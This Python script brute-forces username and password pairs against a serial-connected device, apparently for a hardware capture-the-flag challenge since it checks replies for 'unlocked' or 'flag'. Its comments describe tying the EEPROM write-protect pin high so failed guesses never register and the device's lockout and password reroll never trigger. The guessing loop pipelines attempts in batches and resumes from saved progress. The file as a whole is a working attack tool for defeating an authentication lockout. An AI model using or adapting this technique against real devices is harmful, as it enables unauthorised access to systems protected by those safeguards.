#!/usr/bin/env python3
# Fast, no-rewrite brute (Mode A only: WP-high, zero cooldown).
#
# It NEVER triggers a lockout or a bus-fault recovery: the moment a reply is not
# "denied", it STOPS (does not "recover and continue"), so it can never cause a
# password reroll.
#
# Hardware that makes this safe (Mode A — WP-high):
#   Tie EEPROM WP (pin7) to VCC. Writes are blocked -> no strike ever persists,
#   the chip still ACKs -> the watchdog stays happy. Run flat-out with the chip
#   connected. (fastest)
import serial, time, sys, os, re

PORT     = "/dev/ttyUSB0"
BAUD     = 115200
COMBOS   = "minion_combos.txt"
PROGRESS = "progress.txt"

BATCH    = 10      # pipelined sends before reading replies
READ_PAD = 0.4

s = serial.Serial(PORT, BAUD, timeout=0.03)
s.dtr = False; s.rts = False
time.sleep(0.3); s.reset_input_buffer()

lines = [l.strip() for l in open(COMBOS, encoding="utf-8") if l.strip()]
i = 0
if os.path.exists(PROGRESS):
    try: i = int(open(PROGRESS).read().strip())
    except: i = 0
print(f"{len(lines)} pairs, resuming at index {i}")

def read_replies(n):
    buf = ""; t0 = time.time(); budget = n*0.04 + READ_PAD
    while buf.count("}") < n and time.time()-t0 < budget:
        buf += s.read(512).decode(errors="ignore")
    return re.findall(r'\{[^}]*\}', buf)

def abort(msg, idx):
    open(PROGRESS, "w").write(str(idx))
    print("\n" + "!"*50)
    print("ABORT — " + msg)
    print("A non-'denied' reply means a lockout/bus-fault is starting, which")
    print("REWRITES (rerolls) the password. Stopped so it can't become an L.")
    print(f"Saved at index {idx}. Fix hardware (WP-high),")
    print("re-confirm the target password hasn't changed, then rerun.")
    print("!"*50)
    sys.exit(1)

t0 = time.time(); base = i
while i < len(lines):
    batch = lines[i:i+BATCH]
    s.reset_input_buffer()
    for ln in batch:
        s.write((ln+"\n").encode())
    reps = read_replies(len(batch))

    adv = 0
    for k, rep in enumerate(reps):
        if "unlocked" in rep or '"flag"' in rep:
            open(PROGRESS, "w").write(str(i+k))
            el = time.time()-t0
            print(f"\n===== WIN in {el:.1f}s ({i+k} guesses, {(i+k)/max(el,1e-3):.1f}/s) =====")
            print(batch[k]+"\n"+rep); sys.exit(0)
        if "denied" in rep:
            adv += 1
        else:
            i += adv; abort(f"reply={rep.strip()!r}", i)   # never recover

    if adv < len(batch):
        # lost replies (not necessarily a lockout) -> stop, don't push on
        i += adv; open(PROGRESS, "w").write(str(i))
        abort("incomplete replies (possible missed lock) — raise READ_PAD / lower BATCH", i)

    i += adv; open(PROGRESS, "w").write(str(i))
    rate = (i-base)/max(time.time()-t0, 1e-3)
    print(f"idx {i:5d}/{len(lines)}  {rate:4.1f}/s  {batch[0]}        ", end="\r")

print("\nswept all pairs, no unlock.")
